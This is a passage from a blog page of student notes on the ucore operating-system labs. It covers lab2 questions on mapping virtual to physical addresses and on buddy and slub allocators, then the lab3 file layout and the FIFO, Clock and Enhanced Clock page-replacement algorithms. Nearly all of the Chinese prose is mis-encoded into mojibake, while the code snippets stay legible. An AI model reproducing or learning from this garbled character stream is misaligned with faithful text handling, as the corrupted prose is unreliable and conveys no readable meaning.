style="font-style:italic;background-color:rgb(240,230,250)">å¦‚æœå¸Œæœ›è™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€ç›¸ç­‰ï¼Œåˆ™éœ€è¦å¦‚ä½•ä¿®æ”¹lab2ï¼Œå®Œæˆæ­¤äº‹ï¼Ÿ é¼“åŠ±é€šè¿‡ç¼–ç¨‹æ¥å…·ä½“å®Œæˆè¿™ä¸ªé—®é¢˜ </p><ul><li><p>å°†<code>labcodes/lab2/tools/kernel.ld</code>ä¸­çš„åŠ è½½åœ°å€ä»<code>0xC0100000</code>ä¿®æ”¹ä¸º<code>0x0</code></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// ä¿®æ”¹å‰</span><br>. = <span class="hljs-number">0xC0100000</span>;<br><span class="hljs-comment">// ä¿®æ”¹å</span><br>. = <span class="hljs-number">0x0</span>;<br></code></pre></div></td></tr></table></figure></li><li><p>å°†<code>mm/</code>ä¸­çš„å†…æ ¸åç§»åœ°å€ä¿®æ”¹ä¸º0</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// ä¿®æ”¹å‰</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNBASE            0xC0000000</span><br><span class="hljs-comment">// ä¿®æ”¹å</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNBASE            0x0</span><br></code></pre></div></td></tr></table></figure></li><li><p>æœ€åä¸€æ­¥ï¼Œä½†ä¹Ÿæ˜¯å¿…é¡»è¦åšçš„ä¸€æ­¥â€”â€”<strong>å…³é—­é¡µæœºåˆ¶</strong>ã€‚å°†å¼€å¯é¡µæœºåˆ¶çš„é‚£ä¸€æ®µä»£ç åˆ é™¤æˆ–æ³¨é‡Šæ‰æœ€åä¸€å¥å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm"># ä¿®æ”¹å<br>movl %cr0, %eax<br>orl $(CR0_PE | CR0_PG | CR0_AM | CR0_WP | CR0_NE | CR0_TS | CR0_EM | CR0_MP), %eax<br>andl $~(CR0_TS | CR0_EM), %eax<br># æ³¨é‡Šäº†æœ€åä¸€å¥<br># movl %eax, %cr0<br></code></pre></div></td></tr></table></figure></li><li><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œéœ€è¦æŠŠå¼€å¯é¡µè¡¨å…³é—­ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼Œ**å› ä¸ºé¡µè¡¨å¼€å¯æ—¶è®¤ä¸ºåç§»é‡ä¸ä¸º0(æœ‰å¾…è€ƒè¯)**ã€‚</p></li></ul><h3 id="æ‹“å±•ç»ƒä¹ -1"><a href="#æ‹“å±•ç»ƒä¹ -1" class="headerlink" title="æ‹“å±•ç»ƒä¹ "></a>æ‹“å±•ç»ƒä¹ </h3><h4 id="Challenge-1"><a href="#Challenge-1" class="headerlink" title="Challenge 1"></a>Challenge 1</h4><blockquote><p><strong>buddy systemï¼ˆä¼™ä¼´ç³»ç»Ÿï¼‰åˆ†é…ç®—æ³•, <a href="http://coolshell.cn/articles/10427.html">ä¼™ä¼´åˆ†é…å™¨çš„ä¸€ä¸ªæç®€å®ç°</a> <a href="https://github.com/wuwenbin/buddy2/blob/master/buddy2.c">å…·ä½“å®ç°</a></strong></p><p>Buddy Systemç®—æ³•æŠŠç³»ç»Ÿä¸­çš„å¯ç”¨å­˜å‚¨ç©ºé—´åˆ’åˆ†ä¸ºå­˜å‚¨å—(Block)æ¥è¿›è¡Œç®¡ç†, æ¯ä¸ªå­˜å‚¨å—çš„å¤§å°å¿…é¡»æ˜¯2çš„næ¬¡å¹‚(Pow(2, n)), å³1, 2, 4, 8, 16, 32, 64, 128â€¦</p></blockquote><p>ç»è¿‡ä¸€ç•ªæ€è€ƒ, å±äºæ˜¯æ²¡ææ‡‚ç”¨åœ¨è¿™é‡Œçš„ä¼˜åŠ¿åœ¨å“ª, åˆ†é…çš„æ—¶å€™å¾—éå†ä¸€éåŒå‘é“¾è¡¨, æ‰¾åˆ°äº†å†åˆ†å‰², å’ŒFIFOæ²¡å•¥åŒºåˆ«, é‡Šæ”¾æ—¶ç¨å¾®æœ‰ä¸€ç‚¹ä¼˜åŠ¿,  ä½†æœ€ä¸»è¦çš„é—®é¢˜æ˜¯å¦‚æœå†…å­˜æ¢æµ‹å¼„å‡ºçš„blockå¾ˆå¤šçš„è¯ä¹Ÿå°±åªæœ‰ç•¥å¾®æœ‰ä¸€ç‚¹ä¼˜åŠ¿, è‡³äºç”¨åŒå‘é“¾è¡¨è€Œä¸æ˜¯äºŒå‰æ ‘å°±æ›´ç¦»è°±äº†, ä¸å¦‚ä¸å†™</p><h4 id="Challenge-2"><a href="#Challenge-2" class="headerlink" title="Challenge 2"></a>Challenge 2</h4><blockquote><p>slubç®—æ³•ï¼Œå®ç°ä¸¤å±‚æ¶æ„çš„é«˜æ•ˆå†…å­˜å•å…ƒåˆ†é…ï¼Œç¬¬ä¸€å±‚æ˜¯åŸºäºé¡µå¤§å°çš„å†…å­˜åˆ†é…ï¼Œç¬¬äºŒå±‚æ˜¯åœ¨ç¬¬ä¸€å±‚åŸºç¡€ä¸Šå®ç°åŸºäºä»»æ„å¤§å°çš„å†…å­˜åˆ†é…ã€‚å¯ç®€åŒ–å®ç°ï¼Œèƒ½å¤Ÿä½“ç°å…¶ä¸»ä½“æ€æƒ³å³å¯ã€‚</p><ul><li>å‚è€ƒ<a href="http://www.ibm.com/developerworks/cn/linux/l-cn-slub/">linuxçš„slubåˆ†é…ç®—æ³•/</a>ï¼Œåœ¨ucoreä¸­å®ç°slubåˆ†é…ç®—æ³•ã€‚è¦æ±‚æœ‰æ¯”è¾ƒå……åˆ†çš„æµ‹è¯•ç”¨ä¾‹è¯´æ˜å®ç°çš„æ­£ç¡®æ€§ï¼Œéœ€è¦æœ‰è®¾è®¡æ–‡æ¡£ã€‚</li></ul></blockquote><h1 id="Lab3"><a href="#Lab3" class="headerlink" title="Lab3"></a>Lab3</h1><h2 id="çŸ¥è¯†ç‚¹-2"><a href="#çŸ¥è¯†ç‚¹-2" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><h3 id="0-é¡¹ç›®ç»„æˆ"><a href="#0-é¡¹ç›®ç»„æˆ" class="headerlink" title="0.é¡¹ç›®ç»„æˆ"></a>0.é¡¹ç›®ç»„æˆ</h3><p>ç›¸å¯¹ä¸å®éªŒäºŒï¼Œå®éªŒä¸‰ä¸»è¦æ”¹åŠ¨å¦‚ä¸‹ï¼š</p><ul><li>kern/mm/default_pmm.[ch]ï¼šå®ç°åŸºäºstruct pmm_managerç±»æ¡†æ¶çš„Fist-Fitç‰©ç†å†…å­˜åˆ†é…å‚è€ƒå®ç°ï¼ˆåˆ†é…æœ€å°å•ä½ä¸ºé¡µï¼Œå³4096å­—èŠ‚ï¼‰ï¼Œç›¸å…³åˆ†é…é¡µå’Œé‡Šæ”¾é¡µç­‰å®ç°ä¼šé—´æ¥è¢«kmalloc/kfreeç­‰å‡½æ•°ä½¿ç”¨ã€‚</li><li>kern/mm/pmm.[ch]ï¼špmm.hå®šä¹‰ç‰©ç†å†…å­˜åˆ†é…ç±»æ¡†æ¶struct pmm_managerã€‚pmm.cåŒ…å«äº†å¯¹æ­¤ç‰©ç†å†…å­˜åˆ†é…ç±»æ¡†æ¶çš„è®¿é—®ï¼Œä»¥åŠä¸å»ºç«‹ã€ä¿®æ”¹ã€è®¿é—®é¡µè¡¨ç›¸å…³çš„å„ç§å‡½æ•°å®ç°ã€‚åœ¨æœ¬å®éªŒä¸­ä¼šç”¨åˆ°kmalloc/kfreeç­‰å‡½æ•°ã€‚</li><li>libs/list.hï¼šå®šä¹‰äº†é€šç”¨åŒå‘é“¾è¡¨ç»“æ„ä»¥åŠç›¸å…³çš„æŸ¥æ‰¾ã€æ’å…¥ç­‰åŸºæœ¬æ“ä½œï¼Œè¿™æ˜¯å»ºç«‹åŸºäºé“¾è¡¨æ–¹æ³•çš„ç‰©ç†å†…å­˜ç®¡ç†ï¼ˆä»¥åŠå…¶ä»–å†…æ ¸åŠŸèƒ½ï¼‰çš„åŸºç¡€ã€‚åœ¨lab0æ–‡æ¡£ä¸­æœ‰ç›¸å…³æè¿°ã€‚å…¶ä»–æœ‰ç±»ä¼¼åŒå‘é“¾è¡¨éœ€æ±‚çš„å†…æ ¸åŠŸèƒ½æ¨¡å—å¯ç›´æ¥ä½¿ç”¨list.hä¸­å®šä¹‰çš„å‡½æ•°ã€‚åœ¨æœ¬å®éªŒä¸­ä¼šå¤šæ¬¡ç”¨åˆ°æ’å…¥ï¼Œåˆ é™¤ç­‰æ“ä½œå‡½æ•°ã€‚</li><li>kern/driver/ide.[ch]ï¼šå®šä¹‰å’Œå®ç°äº†å†…å­˜é¡µswapæœºåˆ¶æ‰€éœ€çš„ç£ç›˜æ‰‡åŒºçš„è¯»å†™æ“ä½œæ”¯æŒï¼›åœ¨æœ¬å®éªŒä¸­ä¼šæ¶‰åŠé€šè¿‡swapfs_*å‡½æ•°é—´æ¥ä½¿ç”¨æ–‡ä»¶ä¸­çš„å‡½æ•°ã€‚æ•…äº†è§£å³å¯ã€‚</li><li>kern/fs/*ï¼šå®šä¹‰å’Œå®ç°äº†å†…å­˜é¡µswapæœºåˆ¶æ‰€éœ€ä»ç£ç›˜è¯»æ•°æ®åˆ°å†…å­˜é¡µå’Œå†™å†…å­˜æ•°æ®åˆ°ç£ç›˜ä¸Šå»çš„å‡½æ•° swapfs_read/swapfs_writeã€‚åœ¨æœ¬å®éªŒä¸­ä¼šæ¶‰åŠä½¿ç”¨è¿™ä¸¤ä¸ªå‡½æ•°ã€‚</li><li>kern/mm/memlayout.hï¼šä¿®æ”¹äº†struct Pageï¼Œå¢åŠ äº†ä¸¤é¡¹pra_*æˆå‘˜ç»“æ„ï¼Œå…¶ä¸­pra_page_linkå¯ä»¥ç”¨æ¥å»ºç«‹æè¿°å„ä¸ªé¡µè®¿é—®æƒ…å†µï¼ˆæ¯”å¦‚æ ¹æ®è®¿é—®å…ˆåï¼‰çš„é“¾è¡¨ã€‚åœ¨æœ¬å®éªŒä¸­ä¼šæ¶‰åŠä½¿ç”¨è¿™ä¸¤ä¸ªæˆå‘˜ç»“æ„ï¼Œä»¥åŠle2pageç­‰å®ã€‚</li><li>kern/mm/vmm.[ch]ï¼švmm.hæè¿°äº†mm_structï¼Œvma_structç­‰è¡¨è¿°å¯è®¿é—®çš„è™šå­˜åœ°å€è®¿é—®çš„ä¸€äº›ä¿¡æ¯ï¼Œä¸‹é¢ä¼šè¿›ä¸€æ­¥è¯¦ç»†è®²è§£ã€‚vmm.cæ¶‰åŠmm,vmaç»“æ„æ•°æ®çš„åˆ›å»º/é”€æ¯/æŸ¥æ‰¾/æ’å…¥ç­‰å‡½æ•°ï¼Œè¿™äº›å‡½æ•°åœ¨check_vmaã€check_vmmç­‰ä¸­è¢«ä½¿ç”¨ï¼Œç†è§£å³å¯ã€‚è€Œpage faultå¤„ç†ç›¸å…³çš„do_pgfaultå‡½æ•°æ˜¯æœ¬æ¬¡å®éªŒéœ€è¦æ¶‰åŠå®Œæˆçš„ã€‚</li><li>kern/mm/swap.[ch]ï¼šå®šä¹‰äº†å®ç°é¡µæ›¿æ¢ç®—æ³•ç±»æ¡†æ¶struct swap_managerã€‚swap.cåŒ…å«äº†å¯¹æ­¤é¡µæ›¿æ¢ç®—æ³•ç±»æ¡†æ¶çš„åˆå§‹åŒ–ã€é¡µæ¢å…¥/æ¢å‡ºç­‰å„ç§å‡½æ•°å®ç°ã€‚é‡ç‚¹æ˜¯è¦ç†è§£ä½•æ—¶è°ƒç”¨swap_outå’Œswap_inå‡½æ•°ã€‚å’Œå¦‚ä½•åœ¨æ­¤æ¡†æ¶ä¸‹è¿æ¥å…·ä½“çš„é¡µæ›¿æ¢ç®—æ³•å®ç°ã€‚check_swapå‡½æ•°ä»¥åŠè¢«æ­¤å‡½æ•°è°ƒç”¨çš„_fifo_check_swapå‡½æ•°å®Œæˆäº†å¯¹æœ¬æ¬¡å®éªŒä¸­çš„ç»ƒä¹ 2ï¼šFIFOé¡µæ›¿æ¢ç®—æ³•åŸºæœ¬æ­£ç¡®æ€§çš„æ£€æŸ¥ï¼Œå¯äº†è§£ï¼Œä¾¿äºçŸ¥é“ä¸ºä½•äº§ç”Ÿé”™è¯¯ã€‚</li><li>kern/mm/swap_fifo.[ch]ï¼šFIFOé¡µæ›¿æ¢ç®—æ³•çš„åŸºäºé¡µæ›¿æ¢ç®—æ³•ç±»æ¡†æ¶struct swap_managerçš„ç®€åŒ–å®ç°ï¼Œä¸»è¦è¢«swap.cçš„ç›¸å…³å‡½æ•°è°ƒç”¨ã€‚é‡ç‚¹æ˜¯_fifo_map_swappableå‡½æ•°ï¼ˆå¯ç”¨äºå»ºç«‹é¡µè®¿é—®å±æ€§å’Œå…³ç³»ï¼Œæ¯”å¦‚è®¿é—®æ—¶é—´çš„å…ˆåé¡ºåºï¼‰å’Œ_fifo_swap_out_victimå‡½æ•°ï¼ˆå¯ç”¨äºå®ç°æŒ‘é€‰å‡ºè¦æ¢å‡ºçš„é¡µï¼‰ï¼Œå½“ç„¶æ¢å‡ºå“ªä¸ªé¡µéœ€è¦å€ŸåŠ©äºfifo_map_swappableå‡½æ•°å»ºç«‹çš„æŸç§å±æ€§å…³ç³»ï¼Œå·²é€‰å‡ºåˆé€‚çš„é¡µã€‚</li><li>kern/mm/mmu.hï¼šå…¶ä¸­å®šä¹‰äº†é¡µè¡¨é¡¹çš„å„ç§å±æ€§ä½ï¼Œæ¯”å¦‚PTE_P\PET_D\PET_Aç­‰ï¼Œå¯¹äºå®ç°æ‰©å±•å®éªŒçš„clockç®—æ³•ä¼šæœ‰å¸®åŠ©ã€‚</li></ul><p>æœ¬æ¬¡å®éªŒçš„ä¸»è¦ç»ƒä¹ é›†ä¸­åœ¨vmm.cä¸­çš„do_pgfaultå‡½æ•°å’Œswap_fifo.cä¸­çš„_fifo_map_swappableå‡½æ•°ã€_fifo_swap_out_victimå‡½æ•°ã€‚</p><h3 id="1-å®éªŒæ‰§è¡Œæµç¨‹æ¦‚è¿°"><a href="#1-å®éªŒæ‰§è¡Œæµç¨‹æ¦‚è¿°" class="headerlink" title="1.å®éªŒæ‰§è¡Œæµç¨‹æ¦‚è¿°"></a>1.å®éªŒæ‰§è¡Œæµç¨‹æ¦‚è¿°</h3><p>é¦–å…ˆæ˜¯åˆå§‹åŒ–è¿‡ç¨‹ã€‚å‚è€ƒucoreæ€»æ§å‡½æ•°initçš„ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°åœ¨è°ƒç”¨å®Œæˆè™šæ‹Ÿå†…å­˜åˆå§‹åŒ–çš„vmm_initå‡½æ•°ä¹‹å‰ï¼Œéœ€è¦é¦–å…ˆè°ƒç”¨pmm_initå‡½æ•°å®Œæˆç‰©ç†å†…å­˜çš„ç®¡ç†ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬lab2å·²ç»å®Œæˆçš„å†…å®¹ã€‚æ¥ç€æ˜¯æ‰§è¡Œä¸­æ–­å’Œå¼‚å¸¸ç›¸å…³çš„åˆå§‹åŒ–å·¥ä½œï¼Œå³è°ƒç”¨pic_initå‡½æ•°å’Œidt_initå‡½æ•°ç­‰ï¼Œè¿™äº›å·¥ä½œä¸lab1çš„ä¸­æ–­å¼‚å¸¸åˆå§‹åŒ–å·¥ä½œçš„å†…å®¹æ˜¯ç›¸åŒçš„ã€‚</p><p>åœ¨è°ƒç”¨å®Œidt_initå‡½æ•°ä¹‹åï¼Œå°†è¿›ä¸€æ­¥è°ƒç”¨ä¸‰ä¸ªlab3ä¸­æ‰æœ‰çš„æ–°å‡½æ•°vmm_initã€ide_initå’Œswap_initã€‚è¿™ä¸‰ä¸ªå‡½æ•°æ¶‰åŠäº†æœ¬æ¬¡å®éªŒä¸­çš„ä¸¤ä¸ªç»ƒä¹ ã€‚ç¬¬ä¸€ä¸ªå‡½æ•°vmm_initæ˜¯æ£€æŸ¥æˆ‘ä»¬çš„ç»ƒä¹ 1æ˜¯å¦æ­£ç¡®å®ç°äº†ã€‚ä¸ºäº†è¡¨è¿°ä¸åœ¨ç‰©ç†å†…å­˜ä¸­çš„â€œåˆæ³•â€è™šæ‹Ÿé¡µï¼Œéœ€è¦æœ‰æ•°æ®ç»“æ„æ¥æè¿°è¿™æ ·çš„é¡µï¼Œä¸ºæ­¤ucoreå»ºç«‹äº†mm_structå’Œvma_structæ•°æ®ç»“æ„ï¼ˆæ¥ä¸‹æ¥çš„å°èŠ‚ä¸­æœ‰è¿›ä¸€æ­¥è¯¦ç»†æè¿°ï¼‰ï¼Œå‡å®šæˆ‘ä»¬å·²ç»æè¿°å¥½äº†è¿™æ ·çš„â€œåˆæ³•â€è™šæ‹Ÿé¡µï¼Œå½“ucoreè®¿é—®è¿™äº›â€œåˆæ³•â€è™šæ‹Ÿé¡µæ—¶ï¼Œä¼šç”±äºæ²¡æœ‰è™šå®åœ°å€æ˜ å°„è€Œäº§ç”Ÿé¡µè®¿é—®å¼‚å¸¸ã€‚å¦‚æœæˆ‘ä»¬æ­£ç¡®å®ç°äº†ç»ƒä¹ 1ï¼Œåˆ™do_pgfaultå‡½æ•°ä¼šç”³è¯·ä¸€ä¸ªç©ºé—²ç‰©ç†é¡µï¼Œå¹¶å»ºç«‹å¥½è™šå®æ˜ å°„å…³ç³»ï¼Œä»è€Œä½¿å¾—è¿™æ ·çš„â€œåˆæ³•â€è™šæ‹Ÿé¡µæœ‰å®é™…çš„ç‰©ç†é¡µå¸§å¯¹åº”ã€‚è¿™æ ·ç»ƒä¹ 1å°±ç®—å®Œæˆäº†ã€‚</p><p>ide_initå’Œswap_initæ˜¯ä¸ºç»ƒä¹ 2å‡†å¤‡çš„ã€‚ç”±äºé¡µé¢ç½®æ¢ç®—æ³•çš„å®ç°å­˜åœ¨å¯¹ç¡¬ç›˜æ•°æ®å—çš„è¯»å†™ï¼Œæ‰€ä»¥ide_initå°±æ˜¯å®Œæˆå¯¹ç”¨äºé¡µæ¢å…¥æ¢å‡ºçš„ç¡¬ç›˜ï¼ˆç®€ç§°swapç¡¬ç›˜ï¼‰çš„åˆå§‹åŒ–å·¥ä½œã€‚å®Œæˆide_initå‡½æ•°åï¼Œucoreå°±å¯ä»¥å¯¹è¿™ä¸ªswapç¡¬ç›˜è¿›è¡Œè¯»å†™æ“ä½œäº†ã€‚swap_initå‡½æ•°é¦–å…ˆå»ºç«‹swap_managerï¼Œswap_manageræ˜¯å®Œæˆé¡µé¢æ›¿æ¢è¿‡ç¨‹çš„ä¸»è¦åŠŸèƒ½æ¨¡å—ï¼Œå…¶ä¸­åŒ…å«äº†é¡µé¢ç½®æ¢ç®—æ³•çš„å®ç°ï¼ˆå…·ä½“å†…å®¹å¯å‚è€ƒ5å°èŠ‚ï¼‰ã€‚ç„¶åä¼šè¿›ä¸€æ­¥è°ƒç”¨æ‰§è¡Œcheck_swapå‡½æ•°åœ¨å†…æ ¸ä¸­åˆ†é…ä¸€äº›é¡µï¼Œæ¨¡æ‹Ÿå¯¹è¿™äº›é¡µçš„è®¿é—®ï¼Œè¿™ä¼šäº§ç”Ÿé¡µè®¿é—®å¼‚å¸¸ã€‚å¦‚æœæˆ‘ä»¬æ­£ç¡®å®ç°äº†ç»ƒä¹ 2ï¼Œå°±å¯é€šè¿‡do_pgfaultæ¥è°ƒç”¨swap_map_swappableå‡½æ•°æ¥æŸ¥è¯¢è¿™äº›é¡µçš„è®¿é—®æƒ…å†µå¹¶é—´æ¥è°ƒç”¨å®ç°é¡µé¢ç½®æ¢ç®—æ³•çš„ç›¸å…³å‡½æ•°ï¼ŒæŠŠâ€œä¸å¸¸ç”¨â€çš„é¡µæ¢å‡ºåˆ°ç£ç›˜ä¸Šã€‚</p><h3 id="2-ç½®æ¢ç®—æ³•"><a href="#2-ç½®æ¢ç®—æ³•" class="headerlink" title="2.ç½®æ¢ç®—æ³•"></a>2.ç½®æ¢ç®—æ³•</h3><p>æ“ä½œç³»ç»Ÿè¿Ÿæ—©ä¼šç¢°åˆ°æ²¡æœ‰å†…å­˜ç©ºé—²ç©ºé—´è€Œå¿…é¡»è¦ç½®æ¢å‡ºå†…å­˜ä¸­æŸä¸ªâ€œä¸å¸¸ç”¨â€çš„é¡µçš„æƒ…å†µã€‚å¦‚ä½•åˆ¤æ–­å†…å­˜ä¸­å“ªäº›æ˜¯â€œå¸¸ç”¨â€çš„é¡µï¼Œå“ªäº›æ˜¯â€œä¸å¸¸ç”¨â€çš„é¡µï¼ŒæŠŠâ€œå¸¸ç”¨â€çš„é¡µä¿æŒåœ¨å†…å­˜ä¸­ï¼Œåœ¨ç‰©ç†å†…å­˜ç©ºé—²ç©ºé—´ä¸å¤Ÿçš„æƒ…å†µä¸‹ï¼ŒæŠŠâ€œä¸å¸¸ç”¨â€çš„é¡µç½®æ¢åˆ°ç¡¬ç›˜ä¸Šå°±æ˜¯é¡µæ›¿æ¢ç®—æ³•ç€é‡è€ƒè™‘çš„é—®é¢˜ã€‚å®¹æ˜“ç†è§£ï¼Œä¸€ä¸ªå¥½çš„é¡µæ›¿æ¢ç®—æ³•ä¼šå¯¼è‡´é¡µè®¿é—®å¼‚å¸¸æ¬¡æ•°å°‘ï¼Œä¹Ÿå°±æ„å‘³ç€è®¿é—®ç¡¬ç›˜çš„æ¬¡æ•°ä¹Ÿå°‘ï¼Œä»è€Œä½¿å¾—åº”ç”¨ç¨‹åºæ‰§è¡Œçš„æ•ˆç‡å°±é«˜ã€‚æœ¬æ¬¡å®éªŒæ¶‰åŠçš„é¡µæ›¿æ¢ç®—æ³•ï¼ˆåŒ…æ‹¬æ‰©å±•ç»ƒä¹ ï¼‰ï¼š</p><ul><li>å…ˆè¿›å…ˆå‡º(First In First Out, FIFO)é¡µæ›¿æ¢ç®—æ³•ï¼šè¯¥ç®—æ³•æ€»æ˜¯æ·˜æ±°æœ€å…ˆè¿›å…¥å†…å­˜çš„é¡µï¼Œå³é€‰æ‹©åœ¨å†…å­˜ä¸­é©»ç•™æ—¶é—´æœ€ä¹…çš„é¡µäºˆä»¥æ·˜æ±°ã€‚åªéœ€æŠŠä¸€ä¸ªåº”ç”¨ç¨‹åºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å·²è°ƒå…¥å†…å­˜çš„é¡µæŒ‰å…ˆåæ¬¡åºé“¾æ¥æˆä¸€ä¸ªé˜Ÿåˆ—ï¼Œé˜Ÿåˆ—å¤´æŒ‡å‘å†…å­˜ä¸­é©»ç•™æ—¶é—´æœ€ä¹…çš„é¡µï¼Œé˜Ÿåˆ—å°¾æŒ‡å‘æœ€è¿‘è¢«è°ƒå…¥å†…å­˜çš„é¡µã€‚è¿™æ ·éœ€è¦æ·˜æ±°é¡µæ—¶ï¼Œä»é˜Ÿåˆ—å¤´å¾ˆå®¹æ˜“æŸ¥æ‰¾åˆ°éœ€è¦æ·˜æ±°çš„é¡µã€‚FIFOç®—æ³•åªæ˜¯åœ¨åº”ç”¨ç¨‹åºæŒ‰çº¿æ€§é¡ºåºè®¿é—®åœ°å€ç©ºé—´æ—¶æ•ˆæœæ‰å¥½ï¼Œå¦åˆ™æ•ˆç‡ä¸é«˜ã€‚å› ä¸ºé‚£äº›å¸¸è¢«è®¿é—®çš„é¡µï¼Œå¾€å¾€åœ¨å†…å­˜ä¸­ä¹Ÿåœç•™å¾—æœ€ä¹…ï¼Œç»“æœå®ƒä»¬å› å˜â€œè€â€è€Œä¸å¾—ä¸è¢«ç½®æ¢å‡ºå»ã€‚FIFOç®—æ³•çš„å¦ä¸€ä¸ªç¼ºç‚¹æ˜¯ï¼Œå®ƒæœ‰ä¸€ç§å¼‚å¸¸ç°è±¡ï¼ˆBeladyç°è±¡ï¼‰ï¼Œå³åœ¨å¢åŠ æ”¾ç½®é¡µçš„é¡µå¸§çš„æƒ…å†µä¸‹ï¼Œåè€Œä½¿é¡µè®¿é—®å¼‚å¸¸æ¬¡æ•°å¢å¤šã€‚</li><li>æ—¶é’Ÿï¼ˆClockï¼‰é¡µæ›¿æ¢ç®—æ³•ï¼šæ˜¯LRUç®—æ³•çš„ä¸€ç§è¿‘ä¼¼å®ç°ã€‚æ—¶é’Ÿé¡µæ›¿æ¢ç®—æ³•æŠŠå„ä¸ªé¡µé¢ç»„ç»‡æˆç¯å½¢é“¾è¡¨çš„å½¢å¼ï¼Œç±»ä¼¼äºä¸€ä¸ªé’Ÿçš„è¡¨é¢ã€‚ç„¶åæŠŠä¸€ä¸ªæŒ‡é’ˆï¼ˆç®€ç§°å½“å‰æŒ‡é’ˆï¼‰æŒ‡å‘æœ€è€çš„é‚£ä¸ªé¡µé¢ï¼Œå³æœ€å…ˆè¿›æ¥çš„é‚£ä¸ªé¡µé¢ã€‚å¦å¤–ï¼Œæ—¶é’Ÿç®—æ³•éœ€è¦åœ¨é¡µè¡¨é¡¹ï¼ˆPTEï¼‰ä¸­è®¾ç½®äº†ä¸€ä½è®¿é—®ä½æ¥è¡¨ç¤ºæ­¤é¡µè¡¨é¡¹å¯¹åº”çš„é¡µå½“å‰æ˜¯å¦è¢«è®¿é—®è¿‡ã€‚å½“è¯¥é¡µè¢«è®¿é—®æ—¶ï¼ŒCPUä¸­çš„MMUç¡¬ä»¶å°†æŠŠè®¿é—®ä½ç½®â€œ1â€ã€‚å½“æ“ä½œç³»ç»Ÿéœ€è¦æ·˜æ±°é¡µæ—¶ï¼Œå¯¹å½“å‰æŒ‡é’ˆæŒ‡å‘çš„é¡µæ‰€å¯¹åº”çš„é¡µè¡¨é¡¹è¿›è¡ŒæŸ¥è¯¢ï¼Œå¦‚æœè®¿é—®ä½ä¸ºâ€œ0â€ï¼Œåˆ™æ·˜æ±°è¯¥é¡µï¼Œå¦‚æœè¯¥é¡µè¢«å†™è¿‡ï¼Œåˆ™è¿˜è¦æŠŠå®ƒæ¢å‡ºåˆ°ç¡¬ç›˜ä¸Šï¼›å¦‚æœè®¿é—®ä½ä¸ºâ€œ1â€ï¼Œåˆ™å°†è¯¥é¡µè¡¨é¡¹çš„æ­¤ä½ç½®â€œ0â€ï¼Œç»§ç»­è®¿é—®ä¸‹ä¸€ä¸ªé¡µã€‚è¯¥ç®—æ³•è¿‘ä¼¼åœ°ä½“ç°äº†LRUçš„æ€æƒ³ï¼Œä¸”æ˜“äºå®ç°ï¼Œå¼€é”€å°‘ï¼Œéœ€è¦ç¡¬ä»¶æ”¯æŒæ¥è®¾ç½®è®¿é—®ä½ã€‚æ—¶é’Ÿé¡µæ›¿æ¢ç®—æ³•åœ¨æœ¬è´¨ä¸Šä¸FIFOç®—æ³•æ˜¯ç±»ä¼¼çš„ï¼Œä¸åŒä¹‹å¤„æ˜¯åœ¨æ—¶é’Ÿé¡µæ›¿æ¢ç®—æ³•ä¸­è·³è¿‡äº†è®¿é—®ä½ä¸º1çš„é¡µã€‚</li><li>æ”¹è¿›çš„æ—¶é’Ÿï¼ˆEnhanced Clockï¼‰é¡µæ›¿æ¢ç®—æ³•ï¼šåœ¨æ—¶é’Ÿç½®æ¢ç®—æ³•ä¸­ï¼Œæ·˜æ±°ä¸€ä¸ªé¡µé¢æ—¶åªè€ƒè™‘äº†é¡µé¢æ˜¯å¦è¢«è®¿é—®è¿‡ï¼Œä½†åœ¨å®é™…æƒ…å†µä¸­ï¼Œè¿˜åº”è€ƒè™‘è¢«æ·˜æ±°çš„é¡µé¢æ˜¯å¦è¢«ä¿®æ”¹è¿‡ã€‚å› ä¸º<strong>æ·˜æ±°ä¿®æ”¹è¿‡çš„é¡µé¢è¿˜éœ€è¦å†™å›ç¡¬ç›˜(è¿·æƒ‘, ç§»åˆ°swapåˆ†åŒºè·Ÿæ˜¯å¦ä¿®æ”¹è¿‡æœ‰ä»€ä¹ˆå…³ç³»)<strong>ï¼Œä½¿å¾—å…¶ç½®æ¢ä»£ä»·å¤§äºæœªä¿®æ”¹è¿‡çš„é¡µé¢ï¼Œæ‰€ä»¥ä¼˜å…ˆæ·˜æ±°æ²¡æœ‰ä¿®æ”¹çš„é¡µï¼Œå‡å°‘ç£ç›˜æ“ä½œæ¬¡æ•°ã€‚æ”¹è¿›çš„æ—¶é’Ÿç½®æ¢ç®—æ³•é™¤äº†è€ƒè™‘é¡µé¢çš„è®¿é—®æƒ…å†µï¼Œè¿˜éœ€è€ƒè™‘é¡µé¢çš„ä¿®æ”¹æƒ…å†µã€‚å³è¯¥ç®—æ³•ä¸ä½†å¸Œæœ›æ·˜æ±°çš„é¡µé¢æ˜¯æœ€è¿‘æœªä½¿ç”¨çš„é¡µï¼Œè€Œä¸”è¿˜å¸Œæœ›è¢«æ·˜æ±°çš„é¡µæ˜¯åœ¨ä¸»å­˜é©»ç•™æœŸé—´å…¶é¡µé¢å†…å®¹æœªè¢«ä¿®æ”¹è¿‡çš„ã€‚è¿™éœ€è¦ä¸ºæ¯ä¸€é¡µçš„å¯¹åº”é¡µè¡¨é¡¹å†…å®¹ä¸­å¢åŠ 